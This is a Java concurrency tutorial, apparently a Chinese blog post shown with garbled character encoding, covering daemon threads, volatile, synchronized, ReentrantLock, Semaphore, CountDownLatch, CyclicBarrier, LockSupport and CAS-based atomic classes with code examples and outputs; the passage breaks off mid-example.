å®æ¤çº¿ç¨\n\nââ å®æ¤çº¿ç¨æ¯ä¸ç§ç¹æ®ççº¿ç¨ï¼å°±åä»çåå­ä¸æ ·ï¼å®æ¯ç³»ç»çå®æ¤èï¼å¨åå°é»é»çå®æä¸äºç³»ç»çä»»å¡ï¼æ¯å¦åå¾åæ¶çº¿ç¨ãJIT çº¿ç¨å°±å¯ä»¥çè§£ä¸ºå®æ¤çº¿ç¨ãä¸ä¹ç¸å¯¹åºçæ¯ç¨æ·çº¿ç¨ï¼ç¨æ·çº¿ç¨å¯ä»¥è®¤ä¸ºæ¯ç³»ç»çå·¥ä½çº¿ç¨ï¼å®ä¼å®æè¿ä¸ªç¨åºåºè¯¥è¦å®æçä¸å¡æä½ãå¦æç¨æ·çº¿ç¨å¨é¨ç»æï¼è¿ä¹æå³çè¿ä¸ªç¨åºå®éä¸æ äºå¯åãå®æ¤çº¿ç¨è¦å®æ¤çå¯¹è±¡å·²ç»ä¸å­å¨äºï¼é£ä¹æ´ä¸ªåºç¨ç¨åºå°±èªç¶åºè¯¥ç»æãå æ­¤ï¼å½ä¸ä¸ª java åºç¨åï¼åªæå®æ¤çº¿ç¨æ¶ï¼java èææºå°±ä¼èªç¶éåºã\n\n        t1.setDaemon(true);\n        t2.setDaemon(true);\n        t1.start();\n        t2.start();\n\n\n1\n2\n3\n4\n\n\nââ è®¾ç½®å®æ¤çº¿ç¨å¿é¡»å¨ start () ä¹åè®¾ç½®ãå¦æä¸è¿°ä¾å­ä¸¤ä¸ªé½æ¯å®æ¤çº¿ç¨ï¼åä¸ä¼ç­å°çº¿ç¨éæå°ç»æï¼ç¨åºç´æ¥ç»æãç¨æ·çº¿ç¨çè¯ï¼ä¼ç­å°çº¿ç¨ä»¥ä¸ä¸¤ä¸ªçº¿ç¨æ§è¡å®æï¼åä¸»çº¿ç¨ç»æã\n\n\n# setPriority () çº¿ç¨ä¼åçº§\n\nââ java ä¸­ï¼ä½¿ç¨ 1-10 è¡¨ç¤ºçº¿ç¨ä¼åçº§ï¼æ°å­è¶å¤§åè¶ä¼åã\n\n\n# ä¸ãvolatile\n\nâ â å½ä½ ç¨ volatile å»ç³æä¸ä¸ªåéæ¶ï¼å°±ç­äºåè¯äºèææºï¼è¿ä¸ªåéææå¯è½ä¼è¢«æäºç¨åºæèçº¿ç¨ä¿®æ¹ãä¸ºäºç¡®ä¿è¿ä¸ªåéè¢«ä¿®æ¹åï¼åºç¨ç¨åºèå´åçææçº¿ç¨é½è½å¤ "çå°" è¿ä¸ªæ¹å¨ï¼èææºå°±å¿é¡»éç¨ä¸äºç¹æ®çææ®µï¼ä¿è¯è¿ä¸ªåéçå¯è§æ§ãæåºæ§ãåå­æ§ã\nââ volatile å¯¹äºä¿è¯æä½çåå­æ§æ¯æéå¸¸å¤§çå¸®å©çãä½æ¯éè¦æ³¨æçæ¯ï¼volatile å¹¶ä¸è½ä»£æ¿éï¼ä»ä¹æ æ³ä¿è¯ä¸äºå¤åæä½çåå­æ§ãæ¯å¦ i++\n\n\n# åãsynchronized\n\nâ â synchronized çä½ç¨æ¯å®ç°çº¿ç¨é´çåæ­¥ãå®çå·¥ä½æ¯å¯¹åæ­¥çä»£ç å éï¼ä½¿å¾æ¯ä¸æ¬¡åªè½æä¸ä¸ªçº¿ç¨è¿å¥åæ­¥åï¼ä»èä¿è¯çº¿ç¨é´çå®å¨æ§ã\n\n * æå®å éå¯¹è±¡ï¼å¯¹ç»å®çå¯¹è±¡å éï¼è¿å¥åæ­¥ä»£ç åè¦è·å¾ç»å®å¯¹è±¡çéï¼ä¸è¦ä¿è¯æ¯ä¸ªçº¿ç¨éç synchronized (å¯¹è±¡) çå¯¹è±¡åæ°æ¯åä¸ä¸ªå®ä¾ã\n * ç´æ¥ä½ç¨äºå®ä¾æ¹æ³ï¼ç¸å½äºå¯¹å½åå®ä¾å éï¼è¿å¥åæ­¥ä»£ç åè¦è·å¾å½åå®ä¾çéãè¥ä¸¤ä¸ªçº¿ç¨ä¸æ¯åä¸ä¸ªå®ä¾ï¼åéå¤±è´¥ã\n * ç´æ¥ä½ç¨äºéææ¹æ³ï¼ç¸å½äºå¯¹å½åç±»å éï¼è¿å¥åæ­¥ä»£ç åè¦è·å¾å½åç±»çéã\n\n    public static int i = 0;\n    public static void main(String[] args) throws InterruptedException {\n        String a = "aaa";\n        String b = "aaa";\n        Thread t1 = new Thread(() -> {\n            for(int j=0;j<100000;j++){\n                synchronized (a){\n                    add();\n                }\n            }\n        });\n        Thread t2 = new Thread(() ->  {\n            for(int j=0;j<100000;j++){\n                synchronized (b){\n                    add();\n                }\n            }\n        });\n        t1.start();\n        t2.start();\n        t1.join();\n        t2.join();\n        System.out.println(i);\n    }\n    public static void add(){\n        i++;\n    }\nç»æï¼\n200000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n    public static int i = 0;\n    public static void main(String[] args) throws InterruptedException {\n        String a = "aaa";\n        String b = "bbb";\n        Thread t1 = new Thread(() -> {\n            for(int j=0;j<100000;j++){\n                synchronized (a){\n                    add();\n                }\n            }\n        });\n        Thread t2 = new Thread(() ->  {\n            for(int j=0;j<100000;j++){\n                synchronized (b){\n                    add();\n                }\n            }\n        });\n        t1.start();\n        t2.start();\n        t1.join();\n        t2.join();\n        System.out.println(i);\n    }\n    public static void add(){\n        i++;\n    }\nç»æï¼\n112775\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n    public static int i = 0;\n    public static void main(String[] args) throws InterruptedException {\n        String a = new String("aaa");\n        String b = new String("aaa");\n        Thread t1 = new Thread(() -> {\n            for(int j=0;j<100000;j++){\n                synchronized (a){\n                    add();\n                }\n            }\n        });\n        Thread t2 = new Thread(() ->  {\n            for(int j=0;j<100000;j++){\n                synchronized (b){\n                    add();\n                }\n            }\n        });\n        t1.start();\n        t2.start();\n        t1.join();\n        t2.join();\n        System.out.println(i);\n        System.out.println(a);\n        System.out.println(b);\n    }\n    public static void add(){\n        i++;\n    }\nç»æï¼\n106451\naaa\naaa\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# åãReentrantLock éå¥é\n\nââå½çº¿ç¨è¯·æ±ä¸ä¸ªç±å¶å®çº¿ç¨ææçå¯¹è±¡éæ¶ï¼è¯¥çº¿ç¨ä¼é»å¡ï¼èå½çº¿ç¨è¯·æ±ç±èªå·±ææçå¯¹è±¡éæ¶ï¼å¦æè¯¥éæ¯éå¥éï¼è¯·æ±å°±ä¼æåï¼å¦åé»å¡ãç¹å«æ³¨æï¼è¥ä¸ä¸ªçº¿ç¨å¤æ¬¡è·å¾éï¼é£ä¹å¨éæ¾æå¾æ¶åï¼ä¹å¿é¡»éæ¾ç¸åæ¬¡æ°ã\nââ synchronized ä¹æ¯éå¥éï¼å½ä¸ä¸ªç±»éç AãBãC ä¸ä¸ªæ¹æ³é½è¢«å ä¸ synchronized å A è°ç¨ Bï¼B è°ç¨ C ä¼ä¾æ¬¡æ­£ç¡®è°ç¨æ§è¡ï¼å¦æ synchronized ä¸æ¯éå¥éï¼åè¿ç§è°ç¨æ¹å¼ä¼è¢« æä¸ºæ­»éï¼å ä¸º A B C ä¸ä¸ªæ¹æ³ææçæ¯åä¸ä¸ªå®ä¾ã\n\n\n# reentrantLock.lockInterruptibly () ä¸­æ­å¤ç\n\nââ å¨ç­å¾éçè¿ç¨ä¸­ï¼ç¨åºå¯ä»¥æ ¹æ®éè¦åæ¶å¯¹éçç³è¯·ãlockInterruptibly () å¯¹ä¸­æ­è¿è¡ååºçéç³è¯·å¨ä½ï¼å³å¨ç­å¾éçè¿ç¨ä¸­ï¼å¯ä»¥ååºä¸­æ­ã\n\n\n# reentrantLock.tryLock () éç³è¯·ç­å¾éæ¶\n\nââ tryLock () æä¸¤ç§æ¹æ³\n\n * reentrantLock.tryLock (5, TimeUnit.SECONDS); å¦æéè¢«å¶ä»çº¿ç¨å ç¨åç­å¾ 5 ç§ï¼è¶è¿ 5 ç§æ²¡æå¾å°éï¼å°±ä¼è¿å falseï¼æåå¾å°éåè¿å trueã\n * reentrantLock.tryLock (); å¦æéè¢«å¶ä»çº¿ç¨å ç¨åç´æ¥è¿å falseï¼å¾å°éåç´æ¥è¿å true\n\n\n# ReentrantLock (true) å¬å¹³é\n\nââ å¨å¤§å¤æåµä¸éé½æ¯éå¬å¹³çãä¹å°±æ¯è¯´ï¼çº¿ç¨ 1 å çº¿ç¨ 2 åæ¶è¯·æ±äºé Aï¼é£ä¹å½é A å¯ç¨æ¶ï¼æ¯çº¿ç¨ 1 å¯ä»¥è·å¾éè¿æ¯çº¿ç¨ 2 å¯ä»¥è·å¾éå¢ï¼è¿æ¯ä¸ä¸å®çï¼ç³»ç»åªæ¯ä¼ä»è¿ä¸ªéçç­å¾éåç§éæºæéä¸ä¸ªã\nââ å½ new ReentrantLock (true) è¡¨ç¤ºæ¯å¬å¹³çãä½è¦å®ç°ä¸ä¸ªå¬å¹³éï¼å¿ç¶è¦æ±ç³»ç»ç»´æ¤ä¸ä¸ªæåºéåï¼å æ­¤å¬å¹³éçå®ç°ææ¬æ¯è¾é«äºï¼å¦ææ²¡æç¹å«çéè¦ï¼ä¹ä¸éè¦ä½¿ç¨å¬å¹³éã\n\n> reentrantLock.lock (); è·å¾éï¼å¦æéè¢«å ç¨åç­å¾ï¼\n> reentrantLock.tryLock (); çº¿ç¨å°è¯è·åéï¼å¦æè·åæåï¼åè¿å trueï¼å¦æè·åå¤±è´¥ï¼å³éå·²è¢«å¶ä»çº¿ç¨è·åï¼ï¼åè¿å false\n> reentrantLock.tryLock (long timeoutï¼TimeUnit unit); çº¿ç¨å¦æå¨æå®ç­å¾æ¶é´åè·å¾äºéï¼å°±è¿å trueï¼å¦åè¿å false\n> reentrantLock.unlock (); éæ¾é\n> reentrantLock.isHeldByCurrentThread () å½åçº¿ç¨æ¯å¦ææè¯¥é\n> reentrantLock.lockInterruptibly () è·å¾éï¼ä½æçº¿ååºä¸­æ­\n> reentrantLock.getHoldCount (); å½åçº¿ç¨è°ç¨ lock () æ¹æ³çæ¬¡æ°\n> reentrantLock.getQueueLength (); å½åæ­£å¨ç­å¾è·å Lock éççº¿ç¨çä¼°è®¡æ°\n> reentrantLock.getWaitQueueLength (Condition condition); å½åæ­£å¨ç­å¾ç¶æççº¿ç¨çä¼°è®¡æ°ï¼éè¦ä¼ å¥ Condition å¯¹è±¡\n> reentrantLock.hasWaiters (Condition condition); æ¥è¯¢æ¯å¦æçº¿ç¨æ­£å¨ç­å¾ä¸ Lock éæå³ç Condition æ¡ä»¶\n> reentrantLock.hasQueuedThread (Thread thread); æ¥è¯¢æå®ççº¿ç¨æ¯å¦æ­£å¨ç­å¾è·å Lock é\n> reentrantLock.hasQueuedThreads (); æ¥è¯¢æ¯å¦æçº¿ç¨æ­£å¨ç­å¾è·åæ­¤éå®\n> reentrantLock.isFair (); å¤æ­å½å Lock éæ¯ä¸æ¯å¬å¹³é\n> reentrantLock.hasQueuedThread (Thread thread); æ¥è¯¢æå®ççº¿ç¨æ¯å¦æ­£å¨ç­å¾è·å Lock é\n> reentrantLock.hasQueuedThread (Thread thread); æ¥è¯¢æå®ççº¿ç¨æ¯å¦æ­£å¨ç­å¾è·å Lock é\n> reentrantLock.hasQueuedThread (Thread thread); æ¥è¯¢æå®ççº¿ç¨æ¯å¦æ­£å¨ç­å¾è·å Lock é\n\n\n# Condition æ¡ä»¶\n\n    public static void main(String[] args) throws InterruptedException {\n        ReentrantLock lock = new ReentrantLock();\n        Condition condition = lock.newCondition();\n        new Thread(() -> {\n            try{\n                System.out.println("è¿å¥æµè¯");\n                lock.lock();\n                System.out.println("è·åé");\n                condition.await();\n                System.out.println("ç­å¾ç»æ");\n                Thread.sleep(5000);\n                System.out.println("è¿æ¯å¯¹æçä¸æ¬¡æµè¯");\n            }catch(Exception e){\n                lock.unlock();\n            }\n        }).start();\n        Thread.sleep(3000);\n        System.out.println("ç­å¾ä¸ç§ç»æ");\n        lock.lock();\n        condition.signal();\n        lock.unlock();\n    }\nç»æï¼\nè¿å¥æµè¯\nè·åé\nç­å¾ä¸ç§ç»æ\nç­å¾ç»æ\nè¿æ¯å¯¹æçä¸æ¬¡æµè¯\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\nââ å Object é waite () notify () ä¸æ ·ï¼å½çº¿ç¨ä½¿ç¨ condition.await () æ¶ï¼è¦æ±çº¿ç¨ææç¸å³çéå¥éï¼å¨ condition.await () è°ç¨åï¼è¿ä¸ªçº¿ç¨ä¼éæ¾è¿æéãåçï¼å¨ condition.signal () æ¹æ³è°ç¨æ¶ï¼ä¹è¦æ±çº¿ç¨åè·å¾ç¸å³éï¼å¨ condition.signal () æ¹æ³è°ç¨åï¼ç³»ç»ä¼ä»å½å Condition å¯¹è±¡çç­å¾éåä¸­ï¼å¤éä¸ä¸ªçº¿ç¨ï¼ä¸æ¦çº¿ç¨å¤éï¼å®ä¼éæ°å°è¯è·å¾ä¸ä¹ç»å®çéå¥éï¼ä¸æ¦æåè·åï¼å°±å¯ä»¥ç»§ç»­æ§è¡ãå æ­¤ï¼å¨ condition.signal () æ¹æ³è°ç¨åï¼ä¸è¬éè¦éæ¾ç¸å³çéï¼è®©ç»è¢«å¤éççº¿ç¨ï¼è®©å®ç»§ç»­æ§è¡ã\n\n\n# äºãä¿¡å·é Semaphore\n\nââ ä¿¡å·éä¸ºå¤çº¿ç¨åä½æä¾æ´ä¸ºå¼ºå¤§çæ§å¶æ¹æ³ãå¹¿ä¹ä¸è®²ï¼ä¿¡å·éæ¯å¯¹éçæ©å±ãæ è®ºæ¯åé¨ synchronized è¿æ¯ ReentrantLockï¼ä¸æ¬¡é½åªåè®¸ä¸ä¸ªçº¿ç¨è®¿é®ä¸ä¸ªèµæºï¼èä¿¡å·éå´å¯ä»¥æå®å¤ä¸ªçº¿ç¨ï¼åæ¶è®¿é®æ¸ä¸ä¸ªèµæºãå¨æé ä¿¡å·éå¯¹è±¡æ¶ï¼å¿é¡»è¦æå®ä¿¡å·éçåå¥æ°ï¼å³åæ¶è½ç³è¯·å¤å°ä¸ªè®¸å¯ã\n\nSemaphore semaphore = new Semaphore(3);\nSemaphore semaphore1 = new Semaphore(3,true); // ç¬¬äºä¸ªåæ°æå®æ¯å¦å¬å¹³\n\n\n1\n2\n\n * acquire () å°è¯è·å¾ä¸ä¸ªåå¥è®¸å¯ãè¥æ æ³è·å¾ï¼åçº¿ç¨ä¼ç­å¾ï¼ç´å°æçº¿ç¨éæ¾ä¸ä¸ªè®¸å¯æèå½åçº¿ç¨è¢«ä¸­æ­ã\n * acquireUninterruptibly () å acquire () ç±»ä¼¼ï¼ä½ä¸ä¼ååºä¸­æ­ã\n * tryAcquire () å°è¯è·å¾ä¸ä¸ªè®¸å¯ï¼æåè¿å trueï¼å¤±è´¥è¿å falseã\n * release () å¨çº¿ç¨è®¿é®èµæºç»æåï¼éæ¾ä¸ä¸ªè®¸å¯ï¼ä»¥ä½¿å¶ä»ç­å¾è®¸å¯ççº¿ç¨å¯ä»¥è¿è¡èµæºè®¿é®ã\n\n    public static void main(String[] args) throws InterruptedException {\n        Semaphore semaphore = new Semaphore(3);\n        for(int i=0;i<20;i++){\n            new Thread(() -> {\n                try {\n                    semaphore.acquire();\n                    Thread.sleep(2000);\n                    System.out.println("ç»æ -> "+ Thread.currentThread().getId());\n                    semaphore.release();\n                }catch (Exception e){\n\n                }\n            }).start();\n        }\n    }\nç»æï¼\nç»æ -> 13\nç»æ -> 14\nç»æ -> 12\nç»æ -> 15\n...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# å­ãReetrantReadWriteLock è¯»åé\n\nââ ReetrantReadWriteLock å®ç°äº ReadWriteLock æ¥å£ï¼ReadWriteLock ç®¡çä¸ç»éï¼ä¸ä¸ªæ¯åªè¯»çéï¼ä¸ä¸ªæ¯åéã\n\n * ReetrantReadWriteLock æ¯æè·åéé¡ºåºï¼éå¬å¹³æ¨¡å¼ï¼é»è®¤ï¼ï¼å¬å¹³æ¨¡å¼\n * ReetrantReadWriteLock æ¯æå¯éå¥\n * ReetrantReadWriteLock æ¯æééçº§ï¼å¯ä»¥ä»åééçº§å°è¯»éï¼ä½ä¸è½ä»è¯»éåçº§å°åéã\n\n\n# ä¸ãCountDownLatch åè®¡æ¶å¨\n\n    public static void main(String[] args) throws InterruptedException {\n        CountDownLatch countDownLatch = new CountDownLatch(10);\n        for(int i = 0;i<5;i++){\n            int b = i;\n            new Thread(() -> {\n                System.out.println("i å·²åå¤ = "+ b);\n                countDownLatch.countDown();\n            }).start();\n        }\n        // ç­å¾è£è½½å®æ¯\n        countDownLatch.await();\n        System.out.println("ç»æ");\n    }\nç»æ:\ni å·²åå¤ = 0\ni å·²åå¤ = 1\ni å·²åå¤ = 2\ni å·²åå¤ = 3\ni å·²åå¤ = 4\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nââ ä¸ºä»ä¹æ²¡æè¾åº "ç»æ"ï¼æ¯å ä¸ºæä»¬ç» CountDownLatch çä»»å¡ä¸º 10 ä¸ªï¼ä½æ¯å¾ªç¯åªæ 5 ä¸ªä»»å¡ï¼æä»¥å¨ countDownLatch.await (); ä¼ä¸ç´ç­å¾è£è½½å¤æä¼ç»§ç»­æ§è¡ï¼æä»¥é»å¡å¨é£éãå¦æå¾ªç¯å¤§å°æ¯ CountDownLatch çä»»å¡å¤§ï¼åä¸æ¦è£è½½å¤ï¼åä¼ç«é©¬ç»§ç»­æ§è¡ãcountDownLatch.countDown () åè¯ CountDownLatch å®ä¾ï¼å·²è¿åå¤å¥½ä¸ä¸ªã\n\n   public static void main(String[] args) throws InterruptedException {\n        CountDownLatch countDownLatch = new CountDownLatch(10);\n        for(int i = 0;i<12;i++){\n            int b = i;\n            new Thread(() -> {\n                countDownLatch.countDown();\n                try {\n                    Thread.sleep(5000);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                System.out.println("i å·²åå¤ = "+ b);\n            }).start();\n        }\n        // ç­å¾è£è½½å®æ¯\n        countDownLatch.await();\n        System.out.println("ç»æ");\n    }\nç»æï¼\nç»æ\ni å·²åå¤ = 0\ni å·²åå¤ = 11\ni å·²åå¤ = 6\ni å·²åå¤ = 1\ni å·²åå¤ = 8\ni å·²åå¤ = 5\ni å·²åå¤ = 9\ni å·²åå¤ = 2\ni å·²åå¤ = 3\ni å·²åå¤ = 10\ni å·²åå¤ = 4\ni å·²åå¤ = 7\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# å«ãCyclicBarrier å¾ªç¯æ æ \n\nââ è¿è´§æ¯ CountDownLatch çé¼ä¸ç¹çå°±æ¯ï¼æéé½ 7 æ£µé¾ç ï¼è®¸äºæ¿ï¼è¿å¯ä»¥åç­éé½ 7 æ£µé¾ç ï¼åè®¸æ¿ãåªè¦æéé½ 1 é¢å°±å¿é¡»ç­ 7 æ£µå¨é¨éé½ï¼å¦åä¸ç´ç­å¾ãä½å¬å¤ç¥é¾ä¹æ¯ä¼æä¸éçï¼ä»ä¹æ¶åæè½å½»åºç»æå¢ï¼å°±æ¯ä½ å¨ CyclicBarrier æé å½æ°ä¼ å¥ 7ï¼ä¸æ¦éé½ 7 æ£µé£å°±ç»æäºã\n\n    public static void main(String[] args) throws InterruptedException {\n        int parties = 7;\n        CyclicBarrier cyclicBarrier = new CyclicBarrier(parties);\n        for(int i = 0;i<8;i++){\n            int b = i;\n            if(b%parties ==0) {\n                Thread.sleep(2000);\n            }\n            new Thread(() -> {\n                System.out.println("å·²éé½ "+ (b%parties +1));\n                try {\n                    cyclicBarrier.await();\n                    if(b%parties ==0) {\n                        System.out.println("å¬å¤ç¥é¾");\n                    }\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } catch (BrokenBarrierException e) {\n                    e.printStackTrace();\n                }\n            }).start();\n        }\n    }\nç»è®ºæ¯ï¼\nå·²éé½ 1\nå·²éé½ 2\nå·²éé½ 3\nå·²éé½ 7\nå·²éé½ 5\nå·²éé½ 6\nå·²éé½ 4\nå¬å¤ç¥é¾\nå·²éé½ 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\nââ ä¸è¦å¨ä¹ä»¥ä¸ç»æçé¡ºåºï¼å¯ä»¥çå°å®å·²ç»éé½äº 7 æ£µé¾ç ï¼å¬å¤äºç¥é¾ï¼ä½æ¯å¬å¤å®äºä¹ååå¨å»éé½ï¼è¿æ ·å°±é æäºç­å¾ï¼å¿å¿è¦åæ¬¡éé½å¬å¤ç¥é¾ï¼ä¸å¬å¤äºä¹åä¸åå»éé½äºï¼æè½ç»æè¿ç¨ã\n\n\n# ä¹ãLockSupport çº¿ç¨é»å¡å·¥å·\n\nââ LockSupport æ¯ä¸ä¸ªéå¸¸æ¹ä¾¿å®ç¨çº¿ç¨é»å¡å·¥å·ï¼å®å¯ä»¥å¨çº¿ç¨åä»»æä½ç½®è®©çº¿ç¨é»å¡ãå Thread.suspend () ç¸æ¯ï¼å®å¼¥è¡¥äºç±äº resume () å¨ååçï¼å¯¼è´çº¿ç¨æ æ³ç»§ç»­æ§è¡çæåµãå Object.wait () ç¸æ¯ï¼å®ä¸éè¦åè·å¾æä¸ªå¯¹è±¡éï¼ä¹ä¸ä¼æåº ä¸­æ­å¼å¸¸ï¼ä¸­æ­å¼å¸¸å¯ä»¥å¨çº¿ç¨ä¸­è·å Thread.currentThread ().isInterrupted () æ¥å¾ç¥ã\n\n    public static void main(String[] args) throws InterruptedException {\n        String a = "1";\n        Thread[] threads = new Thread[2];\n        for(int i=0;i<2;i++){\n            int b = i;\n            threads[i] = new Thread(() -> {\n                try {\n                    System.out.println("çº¿ç¨å¯å¨ " + b);\n//                  æåä½¿ç¨è§£é\n                    LockSupport.unpark(Thread.currentThread());\n                    LockSupport.park();\n                    Thread.sleep(3000);\n                    System.out.println("æ§è¡å®æ¯ " + b);\n                } catch (Exception e) {\n                    System.out.println("èå­è¢«ä¸­æ­äº " + b);\n                    // è¿éå¿é¡»å¨ä¸­æ­ä¸æ¬¡ï¼å¦å\n                    Thread.currentThread().interrupt();\n                }\n            });\n        }\n        threads[0].start();\n//        LockSupport.unpark(threads[0]);\n        threads[1].start();\n    }\nè¾åºç»æï¼\nçº¿ç¨å¯å¨ 0\næ§è¡å®æ¯ 0\nçº¿ç¨å¯å¨ 1\næ§è¡å®æ¯ 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# åãæ é\n\nââ å¯¹äºå¹¶åæ§å¶èè¨ï¼éæ¯ä¸ç§æ²è§ç­ç¥ãå®æ»æ¯åè®¾æ¯ä¸æ¬¡çä¸´çåºæä½ä¼äº§çå²çªï¼å æ­¤ï¼å¿é¡»å¯¹æ¯æ¬¡æä½é½å°å¿ç¿¼ç¿¼ãå¦ææå¤ä¸ªçº¿ç¨åæ¶è®¿é®ä¸´çåºèµæºï¼å°±å®å¯çºç²è®©çº¿ç¨ç­å¾ï¼æä»¥è¯´éä¼é»å¡çº¿ç¨æ§è¡ãèæ éæ¯ä¸ç§ä¹è§çç­ç¥ï¼å®ä¼åè®¾å¯¹èµæºçè®¿é®æ²¡æå²çªçãæ¢ç¶æ²¡æå²çªï¼èªç¶ä¸éè¦ç­å¾ï¼æä»¥ææççº¿ç¨é½å¯ä»¥å¨ä¸åé¡¿çç¶æä¸æç»­æ§è¡ãé£éå°å²çªæä¹åï¼æ éçç­ç¥ä½¿ç¨ä¸ç§å«åæ¯è¾äº¤æ¢çææ¯ (CAS compare and Swap) æ¥é´å«çº¿ç¨å²çªï¼ä¸æ¦æ£æµå°å²çªäº§çï¼å°±éè¯å½åæä½ç´å°æ²¡æå²çªä½ç½®ã\nââ ä¸éç¸æ¯ï¼ä½¿ç¨æ¯è¾äº¤æ¢ (CAS) ä¼ä½¿ç¨åºçèµ·æ¥æ´å å¤æä¸äºãä½ç±äºå¶éé»å¡æ§ï¼å®å¯¹æ­»éé®é¢å¤©çåç«ï¼å¹¶ä¸ï¼çº¿ç¨é´çç¸äºå½±åä¹è¿è¿æ¯åºäºéçæ¹å¼è¦å°ãæ´ä¸ºéè¦çæ¯ï¼ä½¿ç¨æ éçæ¹å¼å®å¨æ²¡æéç«äºå¸¦æ¥çç³»ç»å¼éï¼ä¹æ²¡æçº¿ç¨é´é¢ç¹è°åº¦å¸¦æ¥çå¼éï¼å æ­¤ï¼å®è¦æ¯åºäºéçæ¹å¼æ¥ææ´ä¼è¶çæ§è½ã\nââ CAS çç®æ³è¿ç¨æ¯è¿æ ·çï¼å®åå«ä¸ä¸ªåæ° CAS (V,E,N)ãV è¡¨ç¤ºè¦æ´æ°çåéï¼E è¡¨ç¤ºé¢æå¼ï¼N è¡¨ç¤ºæ°å¼ãä»å½ V å¼ç­äº E å¼æ¶ï¼æä¼å° V çå¼è®¾ä¸º Nï¼å¦æ V å¼å E å¼ä¸åï¼åè¯´æå·²ç»æå¶ä»çº¿ç¨åäºæ´æ°ï¼åå½åçº¿ç¨ä»ä¹é½ä¸åãæåï¼CAS è¿åå½å V ççå®å¼ãCAS æä½æ¶æ±çä¹è§çæåº¦è¿è¡ï¼ä»æ»æ¯è®¤ä¸ºèªå·±å¯ä»¥å®ææä½ãå½å¤ä¸ªçº¿ç¨åæ¶ä½¿ç¨ CAS æä½ä¸ä¸ªåéæ¶ï¼åªæä¸ä¸ªä¼èåºï¼å¹¶ä¸æåæ´æ°ï¼å¶ä½åä¼å¤±è´¥ãå¤±è´¥ççº¿ç¨ä¸ä¼è¢«æèµ·ï¼ä»æ¯è¢«åç¥å¤±è´¥ï¼å¹¶ä¸åè®¸åæ¬¡å°è¯ï¼å½ç¶ä¹åè®¸å¤±è´¥ççº¿ç¨æ¾å¼æä½ãåºäºè¿æ ·çåçï¼CAS æä½å³ä½¿æ²¡æéï¼ä¹å¯ä»¥åç°å¶ä»çº¿ç¨å¯¹å½åçº¿ç¨çå¹²æ°ï¼å¹¶è¿è¡æ°å½çå¤çã\n\n\n# AtomicInteger æ éçç³»ç»å®å¨æ´æ°\n\n    public static void main(String[] args) throws InterruptedException {\n        AtomicInteger atomicInteger = new AtomicInteger(0);\n        for(int i=0;i<100;i++){\n            new Thread(() -> {\n                for(int j=0;j<100;j++){\n                    if(atomicInteger.incrementAndGet() == 100){\n                        System.out.println("å§æ§½");\n                    }\n                }\n            }).start();\n        }\n        Thread.sleep(4000);\n        System.out.println(atomicInteger.get());\n    }\nè¾åºç»æï¼\nå§æ§½\n10000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n * get () åå¾å½åå¼\n * set (int newValue) è®¾ç½®å½åå¼\n * getAndSet (int newValue) è®¾ç½®æ°å¼ï¼å¹¶è¿åæ§å¼\n * compareAndSet (int expect, int update) å¦æå½åå¼ä¸º expect (ææ)ï¼åè®¾ç½®ä¸º update (æ°)\n * getAndIncrement () å½åå¼ + 1ï¼è¿åæ§å¼\n * getAndDecrement () å½åå¼ - 1ï¼è¿åæ§å¼\n * getAndAdd (int delta) å½åå¼ + deltaï¼è¿åæ§å¼\n * addAndGet (int delta) å½åå¼ + deltaï¼è¿åæ°å¼\n * incrementAndGet () å½åå¼ + 1ï¼è¿åæ°å¼\n * decrementAndGet () å½åå¼ - 1ï¼è¿åæ°å¼\n\n\n# AtomicReference æ éå¯¹è±¡å¼ç¨ å AtomicStampedReference å¸¦ææ¶é´æ³çå¯¹è±¡å¼ç¨\n\nââ AtomicReference å AtomicInteger éå¸¸ç±»ä¼¼ï¼ä¸åä¹å¤å°±å¨äº AtomicInteger æ¯å¯¹æ´æ°çå°è£ï¼è AtomicReference åå¯¹åºæ®éçå¯¹è±¡å¼ç¨ãä¹å°±æ¯å®å¯ä»¥ä¿è¯ä½ å¨ä¿®æ¹å¯¹è±¡å¼ç¨æ¶ççº¿ç¨å®å¨æ§ã\n\n@Data\n@Accessors(chain = true)\nclass Account{\n    private Integer amount = 0;\n}\n\npublic static void main(String[] args) throws InterruptedException {\n    Account account = new Account();\n    account.setAmount(10);\n    AtomicReference<Account> accountAtomicReference = new AtomicReference<Account>();\n    accountAtomicReference.set(account);\n    // æ¨¡æåå¼\n    for(int i=0;i<3;i++){\n        new Thread(() -> {\n            Account clientAccount = accountAtomicReference.get();\n            System.out.println("åå¼åæ¥è¯¢è¶è¿æ "+ clientAccount.getAmount());\n            if(clientAccount.getAmount() < 20){\n                if(accountAtomicReference.compareAndSet(clientAccount,clientAccount.setAmount(clientAccount.getAmount() + 20) )){\n                    System.out.println("ä½é¢å°äº20åï¼åå¼æåï¼ä½é¢ï¼"+ 